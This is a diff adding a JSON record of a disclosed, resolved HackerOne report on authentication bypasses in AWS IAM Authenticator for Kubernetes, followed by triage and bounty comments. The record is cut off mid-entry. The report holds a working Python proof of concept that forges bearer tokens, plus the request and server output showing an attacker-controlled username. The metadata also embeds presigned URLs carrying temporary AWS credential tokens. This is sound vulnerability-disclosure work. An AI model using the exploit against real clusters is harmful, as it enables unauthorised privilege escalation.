@@ -1,0 +1,486 @@
+{
+  "id": 1580493,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTgwNDkz",
+  "url": "https://hackerone.com/reports/1580493",
+  "title": "Bypass validation parts in AWS IAM Authenticator for Kubernetes",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2022-05-24T19:37:57.994Z",
+  "submitted_at": "2022-05-24T19:37:58.077Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "gaffy",
+    "url": "/gaffy",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 39386,
+    "url": "https://hackerone.com/kubernetes",
+    "handle": "kubernetes",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Kubernetes",
+      "twitter_handle": "kubernetesio",
+      "website": "https://kubernetes.io/",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2023-05-25T12:37:58.089Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2023-04-25T12:37:49.581Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nWhenever the aws-iam-authenticator server gets a POST request to /authenticate it extracts the token and validates it. The token's content is a signed AWS STS request to the GetCallerIdentity endpoint, where the response content is used to map to matching K8s identity (username, groups).\n\nI found several bypasses to validation parts in [AWS IAM Authenticator](https://github.com/kubernetes-sigs/aws-iam-authenticator):\n1. It is possible to craft a token **without signed cluster ID header** and use it for replay attacks.\n2. It is possible to manipulate the extracted **AccessKeyID**. Since the AccessKeyID value [can be used as part of the identity](https://github.com/kubernetes-sigs/aws-iam-authenticator#:~:text=%23%20If%20unalterable%20identification%20of%20an%20IAM%20User%20is%20desirable%2C%20you%20can%20map%20against%0A%20%20%23%20AccessKeyID.), it allows an attacker to gain hight permissions in the cluster.\n3. It is possible to send a request to other action values (not only GetCallerIdentity). Since I couldn't find a way to control the host or add other parameters to the request, the impact of changing the action is low.\n\n## Kubernetes Version:\nall versions\n\n## Component Version:\nall versions. the issue seems to be there from [first commit](https://github.com/kubernetes-sigs/aws-iam-authenticator/commit/aeac2587d437da3751f3be8eb9a79a8311d33dd1#diff-b03d5162238d36a569ac0c110484bf356f617e22967aeb1af853b02993da60b8R141).\n\n## Steps To Reproduce:\n1. Create a K8s cluster with [AWS IAM Authenticator](https://github.com/kubernetes-sigs/aws-iam-authenticator) as auth webhook.\n(I run the aws-iam-authenticator server locally on my machine using the command `aws-iam-authenticator server -c config.yaml`)\n2. You can use the python script below to generate all types of malicious tokens. change the CLUSTER_ID value before running.\n\n```python\nimport base64\nimport boto3\nimport re\nfrom botocore.signers import RequestSigner\n\nREGION = 'us-east-1'\nCLUSTER_ID = 'gaf-cluster'\n\n\ndef get_bearer_token(url, headers):\n    STS_TOKEN_EXPIRES_IN = 60\n    session = boto3.session.Session()\n\n    client = session.client('sts', region_name=REGION)\n    service_id = client.meta.service_model.service_id\n\n    signer = RequestSigner(\n        service_id,\n        REGION,\n        'sts',\n        'v4',\n        session.get_credentials(),\n        session.events\n    )\n\n    params = {\n        'method': 'GET',\n        'url': url,\n        'body': {},\n        'headers': headers,\n        'context': {}\n    }\n\n    signed_url = signer.generate_presigned_url(\n        params,\n        region_name=REGION,\n        expires_in=STS_TOKEN_EXPIRES_IN,\n        operation_name=''\n    )\n\n    return signed_url\n\n\ndef base64_encode_no_padding(signed_url):\n    base64_url = base64.urlsafe_b64encode(signed_url.encode('utf-8')).decode('utf-8')\n\n    # remove any base64 encoding padding:\n    return 'k8s-aws-v1.' + re.sub(r'=*', '', base64_url)\n\n\ndef create_mal_token_with_other_action(action_name):\n    url = f'https://sts.{REGION}.amazonaws.com/?Action={action_name}&Version=2011-06-15&action=GetCallerIdentity'\n    headers = {'x-k8s-aws-id': CLUSTER_ID}\n    signed_url = get_bearer_token(url, headers)\n\n    signed_url = signed_url.replace(f'&action=GetCallerIdentity', '')\n    signed_url += f'&action=GetCallerIdentity'\n\n    return base64_encode_no_padding(signed_url)\n\n\ndef create_mal_token_without_cluster_id_header_signed():\n    url = f'https://sts.{REGION}.amazonaws.com/?Action=GetCallerIdentity&Version=2011-06-15&x-amz-signedheaders=x-k8s-aws-id'\n    headers = {}\n    signed_url = get_bearer_token(url, headers)\n\n    signed_url = signed_url.replace('&x-amz-signedheaders=x-k8s-aws-id', '')\n    signed_url += '&x-amz-signedheaders=x-k8s-aws-id'\n\n    return base64_encode_no_padding(signed_url)\n\n\ndef create_mal_token_with_other_access_key(value):\n    url = f'https://sts.{REGION}.amazonaws.com/?Action=GetCallerIdentity&Version=2011-06-15&x-amz-credential={value}'\n    headers = {'x-k8s-aws-id': CLUSTER_ID}\n    signed_url = get_bearer_token(url, headers)\n\n    signed_url = signed_url.replace(f'&x-amz-credential={value}', '')\n    signed_url += f'&x-amz-credential={value}'\n\n    return base64_encode_no_padding(signed_url)\n\n\nprint(\"Token with other action:\")\nprint(create_mal_token_with_other_action('GetSessionToken'))\n\nprint(\"Token without cluster id header signed:\")\nprint(create_mal_token_without_cluster_id_header_signed())\n\nprint(\"Token with other value as access key:\")\nprint(create_mal_token_with_other_access_key('some-other-value'))\n``` \n\n3. Choose a token and send the HTTP request below to the aws-iam-authenticator server:\n```\nPOST /authenticate HTTP/1.1\nHost: 127.0.0.1:21362\nContent-Length: 563\n\n{\"Spec\":{\"Token\":\"<token-value>\"}}\n```\nNote: You might need to sent the request with the malicious token to the aws-iam-authenticator server multiple times. the reason is explained in the root cause section.\n\n4. View the output of the server and the request:\n* If you chose the \"other action\" token, if the action is valid STS action (such as GetSessionToken) the server will log the following error message: \n*\"sts getCallerIdentity failed: arn '' is invalid: 'arn: invalid prefix'\".*\nIf the action is invalid STS action (such as CreateUser) the server will log the following error message:\n*\"sts getCallerIdentity failed: error from AWS (expected 200, got 400). Body: {\\\"Error\\\":{\\\"Code\\\":\\\"InvalidAction\\\",\\\"Message\\\":\\\"Could not find operation CreateUser for version 2011-06-15\\\",\\\"Type\\\":\\\"Sender\\\"},\\\"RequestId\\\":\\\"0037e282-007f-453c-0017-a0acde0b9b00\\\"}\"*\n\n* If you chose the \"no signed cluster id header\" token, the server will act regularly and will map the arn from the STS response. Note that if requests are being passed through burp, you can send the STS request that was sent by the server to the repeater and delete the \"X-K8s-Aws-Id\" header and its value.\n\n* If you chose the \"other value as access key\", the server will log the injected value as the access key \"accesskeyid=some-other-value\"\nIn this case, it is possible to trick the mapping. Create the following mapping in the aws-iam-authenticator server config:\n```yaml\n  mapUsers:\n  - userARN: arn:aws:iam::000000000000:user/Alice\n    username: user:{{AccessKeyID}}\n    groups:\n    - test\n```\nResent the request with the token and the server will respond with:\n```json\n{\"metadata\":{\"creationTimestamp\":null},\"spec\":{},\"status\":{\"authenticated\":true,\"user\":{\"username\":\"user:some-other-value\",\"uid\":\"aws-iam-authenticator:<aws-account-id>:<aws-user-id>\",\"groups\":[\"test\"],\"extra\":{\"accessKeyId\":[\"some-other-value\"],\"arn\":[\"arn:aws:iam::<aws-account-id>:user/<aws-username>\"],\"canonicalArn\":[\"arn:aws:iam::<aws-account-id>:user/<aws-user-name>\"],\"sessionName\":[\"\"]}}}}\n```\nThe final K8s username was controlled by the attacker.\n\n## Root Cause:\nAll the specified issues happens because of [this code line](https://github.com/kubernetes-sigs/aws-iam-authenticator/blob/master/pkg/token/token.go#L483)\n```go\n\tfor key, values := range queryParams {\n\t\tif !parameterWhitelist[strings.ToLower(key)] {\n\t\t\treturn nil, FormatError{fmt.Sprintf(\"non-whitelisted query parameter %q\", key)}\n\t\t}\n\t\tif len(values) != 1 {\n\t\t\treturn nil, FormatError{\"query parameter with multiple values not supported\"}\n\t\t}\n\t\tqueryParamsLower.Set(strings.ToLower(key), values[0])\n\t}\n```\nIt allows an attacker to send two variables with the same name (but with different uppercase, lowercase characters). For example \"Action\" and \"action\".\nSince both are being \"ToLower\", the value in the queryParamsLower dictionary will be overriden while the request to AWS will be sent with both values (sts.amazonaws.com will ignore the other parameter).\n\nBecause the for loop is not ordered, the parameters are not always overriden in the order we want, therefore we might need to sent the request with the malicious token to the aws-iam-authenticator server multiple times.\n\n## Impact\n\nAn attacker can bypass parts in the authentication and authorization checks that might control the values of the K8s *username* and *groups* during the mapping. This can help an attacker to gain higher permissions in the K8s cluster.",
+  "bounty_amount": "2500.0",
+  "formatted_bounty": "$2,500",
+  "weakness": {
+    "id": 27,
+    "name": "Improper Authentication - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+
+  ],
+  "allow_singular_disclosure_at": "2023-05-25T12:37:49.728Z",
+  "allow_singular_disclosure_after": -10433838.37773642,
+  "singular_disclosure_allowed": true,
+  "vote_count": 64,
+  "voters": [
+    "n1m0",
+    "zy9ard3",
+    "neil-tsakatsa",
+    "address_below0",
+    "aryan2808",
+    "pacmanx",
+    "shivammusic",
+    "luckythandel28",
+    "mr_yayaa",
+    "xgenosama",
+    "and 54 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.1,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 34423,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/kubernetes-sigs",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 16917321,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @gaffy,\n\nThank you for your submission. I hope you are well. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\n\nHave a great day! \n\nKind regards,\n@forest_dweller",
+      "automated_response": false,
+      "created_at": "2022-05-30T12:37:48.007Z",
+      "updated_at": "2022-05-30T12:37:48.007Z",
+      "actor": {
+        "username": "h1_analyst_amey",
+        "cleared": false,
+        "verified": false,
+        "url": "/h1_analyst_amey",
+        "profile_picture_urls": {
+          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/752nxtq8olqtr0zhu4h2jazs3137/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22kimo-pZYzGNUgWbY-unsplash%20%25281%2529.jpg%22%3B%20filename%2A%3DUTF-8%27%27kimo-pZYzGNUgWbY-unsplash%2520%25281%2529.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2ECAEJ7T%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065508Z&X-Amz-Expires=2793&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCDDxB3Q7XXN0MoClgzQmAHL%2B69tZPS%2BE24gR82nPqEdwIhANHQem4W9wXhLoFuofJDx%2FqAIGjY8c0SBI3ehY047uyzKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5Igyma9oQLknRc2EMvTIqjgUdkBAFKeYB0BNxfLIf7yrAK9StAZOAVOqAB2nDAVvZzdGdBpPbafCMX5iFXBElENteTYhD1oHUWNwxHkgt5u5wkdb1iAfAk%2FDc45r%2BH68hwPWE4%2F4Eg9mj91Gun9FDT%2Fnix4%2FEA2ruJyu%2Fvv8ND3MdQJTBAb%2FEwMm37dxSUNFwZSPa5MB5rq7rxHkclV5GeZunw6wxjwnNKSWVzYIrega6azXoJKiHMO2LiXpow9VWmsyKGgoEVjCT3DrNFDLcDRAV7ZYYR%2FBtTEABLI6VBConZfyStVnLgIo3M0177TGG%2FEwQtxOc%2FlceHrcBhQ0l7g20BSRWTkcQdLfc5JjEvPfwN9EK9RZhIOZ26tEogh%2BE4wBA%2BGu1V59BSJEhNWRkZAMN4cfgvY00s%2B3lIi68i86n%2BXIinldM4hWHIi0WaKxhXr%2FBxJ3V7aB3pVfr8OPryPuZl2aTGClP4OHeLNIXiLLjXmPbDQ5rW4U6iO4bvWwQWAPij%2BIFWZMHk9aBT1tISa3sOSasbVTImEeMobt4kpKo%2BryuAcc3u3EyM2UBO5deDXG8FaXy7AA9sPIk42uvn1Rd2Ag6nUqz8GU25dMmhElHL0BU3XvBqc7imweolUyi5cWZHfaDsWKNcnXY8%2F8isxc3j6IfzvExaAAYTJtu7SSY4YpZM0ZSR7JnGK7nskqZPpcefIgtvsbRCB66vMGMLOEho1guaaKayJOP73YtV0HPPhVVzAYDHVc3s26zrlAnHXeqIC6pNt1mOGj%2BnQiGXmm9Agdxh0r0sgUCfCim%2BhnABVjU%2B3RbEn6e1WbqO2Q03ONg4c9OO3k4bR%2BCNvXJnN9UTE%2FRLA0cpWO4zvunZXEm8L9swIaU7CrIhAYCjI0w4v24qAY6sAGjzoEBIxaLDI6WGCHCkPMIuEHQ%2FgGwXuek3FzYMK5VklHKwExgNFnXkauQNdNGpARLJN0Cc6Fnp9zyBu5xmCMFjYPUxaVqEWLLoS1mYlcM8Pup6CI96cb%2B6dKTyHRivKTQECSe1yKBMEmrZgx2s7cqUkvEQEHk4RqiabnQJpgWjtZ5iYpbKCctjviGGkxvRRl4efqx5y77zgpojnaOfOyZyUY3%2BaxxrQU2c%2FcoK81iHg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a0b08256cfc996eee68ebcab6b7bed2eab12d6f8dafa0db97e77bc3a6076d7c8"
+        },
+        "hackerone_triager": true,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 16919484,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @gaffy,\n\nWe would like to inform you that we are going to take longer than usual to triage this report owing to setup required for the issue. We will let you know as soon as we have an update for you.\n\nPlease bear with us in the meantime. Thank you for your patience.\n\nCheers,\n@forest_dweller",
+      "automated_response": false,
+      "created_at": "2022-05-30T14:24:59.182Z",
+      "updated_at": "2022-05-30T14:24:59.182Z",
+      "actor": {
+        "username": "h1_analyst_amey",
+        "cleared": false,
+        "verified": false,
+        "url": "/h1_analyst_amey",
+        "profile_picture_urls": {
+          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/752nxtq8olqtr0zhu4h2jazs3137/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22kimo-pZYzGNUgWbY-unsplash%20%25281%2529.jpg%22%3B%20filename%2A%3DUTF-8%27%27kimo-pZYzGNUgWbY-unsplash%2520%25281%2529.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2ECAEJ7T%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065508Z&X-Amz-Expires=2793&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCDDxB3Q7XXN0MoClgzQmAHL%2B69tZPS%2BE24gR82nPqEdwIhANHQem4W9wXhLoFuofJDx%2FqAIGjY8c0SBI3ehY047uyzKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5Igyma9oQLknRc2EMvTIqjgUdkBAFKeYB0BNxfLIf7yrAK9StAZOAVOqAB2nDAVvZzdGdBpPbafCMX5iFXBElENteTYhD1oHUWNwxHkgt5u5wkdb1iAfAk%2FDc45r%2BH68hwPWE4%2F4Eg9mj91Gun9FDT%2Fnix4%2FEA2ruJyu%2Fvv8ND3MdQJTBAb%2FEwMm37dxSUNFwZSPa5MB5rq7rxHkclV5GeZunw6wxjwnNKSWVzYIrega6azXoJKiHMO2LiXpow9VWmsyKGgoEVjCT3DrNFDLcDRAV7ZYYR%2FBtTEABLI6VBConZfyStVnLgIo3M0177TGG%2FEwQtxOc%2FlceHrcBhQ0l7g20BSRWTkcQdLfc5JjEvPfwN9EK9RZhIOZ26tEogh%2BE4wBA%2BGu1V59BSJEhNWRkZAMN4cfgvY00s%2B3lIi68i86n%2BXIinldM4hWHIi0WaKxhXr%2FBxJ3V7aB3pVfr8OPryPuZl2aTGClP4OHeLNIXiLLjXmPbDQ5rW4U6iO4bvWwQWAPij%2BIFWZMHk9aBT1tISa3sOSasbVTImEeMobt4kpKo%2BryuAcc3u3EyM2UBO5deDXG8FaXy7AA9sPIk42uvn1Rd2Ag6nUqz8GU25dMmhElHL0BU3XvBqc7imweolUyi5cWZHfaDsWKNcnXY8%2F8isxc3j6IfzvExaAAYTJtu7SSY4YpZM0ZSR7JnGK7nskqZPpcefIgtvsbRCB66vMGMLOEho1guaaKayJOP73YtV0HPPhVVzAYDHVc3s26zrlAnHXeqIC6pNt1mOGj%2BnQiGXmm9Agdxh0r0sgUCfCim%2BhnABVjU%2B3RbEn6e1WbqO2Q03ONg4c9OO3k4bR%2BCNvXJnN9UTE%2FRLA0cpWO4zvunZXEm8L9swIaU7CrIhAYCjI0w4v24qAY6sAGjzoEBIxaLDI6WGCHCkPMIuEHQ%2FgGwXuek3FzYMK5VklHKwExgNFnXkauQNdNGpARLJN0Cc6Fnp9zyBu5xmCMFjYPUxaVqEWLLoS1mYlcM8Pup6CI96cb%2B6dKTyHRivKTQECSe1yKBMEmrZgx2s7cqUkvEQEHk4RqiabnQJpgWjtZ5iYpbKCctjviGGkxvRRl4efqx5y77zgpojnaOfOyZyUY3%2BaxxrQU2c%2FcoK81iHg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a0b08256cfc996eee68ebcab6b7bed2eab12d6f8dafa0db97e77bc3a6076d7c8"
+        },
+        "hackerone_triager": true,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 16957637,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @gaffy,\n\nJust letting you know that we are still in the process of validating your report. Thank you for your patience.\n\nCheers,\n@forest_dweller",
+      "automated_response": false,
+      "created_at": "2022-06-01T15:26:54.195Z",
+      "updated_at": "2022-06-01T15:26:54.195Z",
+      "actor": {
+        "username": "h1_analyst_amey",
+        "cleared": false,
+        "verified": false,
+        "url": "/h1_analyst_amey",
+        "profile_picture_urls": {
+          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/752nxtq8olqtr0zhu4h2jazs3137/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22kimo-pZYzGNUgWbY-unsplash%20%25281%2529.jpg%22%3B%20filename%2A%3DUTF-8%27%27kimo-pZYzGNUgWbY-unsplash%2520%25281%2529.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2ECAEJ7T%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065508Z&X-Amz-Expires=2793&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQCDDxB3Q7XXN0MoClgzQmAHL%2B69tZPS%2BE24gR82nPqEdwIhANHQem4W9wXhLoFuofJDx%2FqAIGjY8c0SBI3ehY047uyzKrEFCCMQAxoMMDEzNjE5Mjc0ODQ5Igyma9oQLknRc2EMvTIqjgUdkBAFKeYB0BNxfLIf7yrAK9StAZOAVOqAB2nDAVvZzdGdBpPbafCMX5iFXBElENteTYhD1oHUWNwxHkgt5u5wkdb1iAfAk%2FDc45r%2BH68hwPWE4%2F4Eg9mj91Gun9FDT%2Fnix4%2FEA2ruJyu%2Fvv8ND3MdQJTBAb%2FEwMm37dxSUNFwZSPa5MB5rq7rxHkclV5GeZunw6wxjwnNKSWVzYIrega6azXoJKiHMO2LiXpow9VWmsyKGgoEVjCT3DrNFDLcDRAV7ZYYR%2FBtTEABLI6VBConZfyStVnLgIo3M0177TGG%2FEwQtxOc%2FlceHrcBhQ0l7g20BSRWTkcQdLfc5JjEvPfwN9EK9RZhIOZ26tEogh%2BE4wBA%2BGu1V59BSJEhNWRkZAMN4cfgvY00s%2B3lIi68i86n%2BXIinldM4hWHIi0WaKxhXr%2FBxJ3V7aB3pVfr8OPryPuZl2aTGClP4OHeLNIXiLLjXmPbDQ5rW4U6iO4bvWwQWAPij%2BIFWZMHk9aBT1tISa3sOSasbVTImEeMobt4kpKo%2BryuAcc3u3EyM2UBO5deDXG8FaXy7AA9sPIk42uvn1Rd2Ag6nUqz8GU25dMmhElHL0BU3XvBqc7imweolUyi5cWZHfaDsWKNcnXY8%2F8isxc3j6IfzvExaAAYTJtu7SSY4YpZM0ZSR7JnGK7nskqZPpcefIgtvsbRCB66vMGMLOEho1guaaKayJOP73YtV0HPPhVVzAYDHVc3s26zrlAnHXeqIC6pNt1mOGj%2BnQiGXmm9Agdxh0r0sgUCfCim%2BhnABVjU%2B3RbEn6e1WbqO2Q03ONg4c9OO3k4bR%2BCNvXJnN9UTE%2FRLA0cpWO4zvunZXEm8L9swIaU7CrIhAYCjI0w4v24qAY6sAGjzoEBIxaLDI6WGCHCkPMIuEHQ%2FgGwXuek3FzYMK5VklHKwExgNFnXkauQNdNGpARLJN0Cc6Fnp9zyBu5xmCMFjYPUxaVqEWLLoS1mYlcM8Pup6CI96cb%2B6dKTyHRivKTQECSe1yKBMEmrZgx2s7cqUkvEQEHk4RqiabnQJpgWjtZ5iYpbKCctjviGGkxvRRl4efqx5y77zgpojnaOfOyZyUY3%2BaxxrQU2c%2FcoK81iHg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a0b08256cfc996eee68ebcab6b7bed2eab12d6f8dafa0db97e77bc3a6076d7c8"
+        },
+        "hackerone_triager": true,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 16957678,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @forest_dweller, \n\nThank you for the updates.",
+      "automated_response": false,
+      "created_at": "2022-06-01T15:30:49.339Z",
+      "updated_at": "2022-06-01T15:30:49.339Z",
+      "actor": {
+        "username": "gaffy",
+        "cleared": true,
+        "verified": true,
+        "url": "/gaffy",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 16984769,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Vulnerability was validated by AWS.\nFollowing their request for CVE details: Gafnit Amiga from Lightspin.\n\nHave a great weekend! ",
+      "automated_response": false,
+      "created_at": "2022-06-03T15:44:17.237Z",
+      "updated_at": "2022-06-03T15:44:17.237Z",
+      "actor": {
+        "username": "gaffy",
+        "cleared": true,
+        "verified": true,
+        "url": "/gaffy",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 17108193,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportSeverityUpdated",
+      "message": "Privileges required Low. Identity's ARN must already be allow-listed.\nScope is unchanged:  No access to any other systems than the cluster in question.\nIntegrity high: veracity of identity logged in server and returned to Kubernetes is incorrect",
+      "automated_response": false,
+      "created_at": "2022-06-13T18:16:00.985Z",
+      "updated_at": "2022-06-13T18:16:00.985Z",
+      "additional_data": {
+        "old_severity": "Critical (9.1)",
+        "new_severity": "High (8.1)",
+        "old_severity_id": 1514504,
+        "new_severity_id": 1539554
+      },
+      "actor": {
+        "username": "mhausler",
+        "cleared": false,
+        "verified": false,
+        "url": "/mhausler",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/611/880/c3006222ff073932b4376fc2cef2cbaf94a7afdd_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 17108229,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi Gafnit,\n\nWe're treating this as an [Tier 2](https://hackerone.com/kubernetes?type=team) [High](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N). I need to allocate a 2022 block of CVE IDs for Kubernetes and then I'll reserve one and let you know the ID for this issue.\n\nAWS is rolling out the fix you validated, and this will go through the rest of the month. As we get closer to the fix being deployed, I'll be in touch about a disclosure date, but it'll likely be early July.\n\nThank you!",
+      "automated_response": false,
+      "created_at": "2022-06-13T18:20:58.685Z",
+      "updated_at": "2022-06-13T18:20:58.685Z",
+      "actor": {
+        "username": "mhausler",
+        "cleared": false,
+        "verified": false,
+        "url": "/mhausler",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/611/880/c3006222ff073932b4376fc2cef2cbaf94a7afdd_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 17120468,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi Micah, thank you for the update and severity correction.",
+      "automated_response": false,
+      "created_at": "2022-06-14T11:51:41.357Z",
+      "updated_at": "2022-06-14T11:51:41.357Z",
+      "actor": {
+        "username": "gaffy",
+        "cleared": true,
+        "verified": true,
+        "url": "/gaffy",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 17512963,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi Gafnit, we've allocated CVE-2022-2385 for this issue",
+      "automated_response": false,
+      "created_at": "2022-07-11T15:54:03.509Z",
+      "updated_at": "2022-07-11T15:54:03.509Z",
+      "actor": {
+        "username": "mhausler",
+        "cleared": false,
+        "verified": false,
+        "url": "/mhausler",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/611/880/c3006222ff073932b4376fc2cef2cbaf94a7afdd_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 19178159,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BountyAwarded",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2022-11-10T18:52:00.582Z",
+      "updated_at": "2022-11-10T18:52:00.582Z",
+      "actor": {
+        "url": "/kubernetes",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "Kubernetes"
+        }
+      },
+      "bounty_amount": "2500.0",
+      "bonus_amount": "0.0",
+      "bounty_currency": "usd",
+      "genius_execution_id": null,
+      "team_handle": "kubernetes",
+      "collaborator": {
+        "username": "gaffy",
+        "url": "/gaffy"
+      }
+    },
+    {
+      "id": 19309742,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thank you for the reward!",
+      "automated_response": false,
+      "created_at": "2022-11-22T17:57:08.293Z",
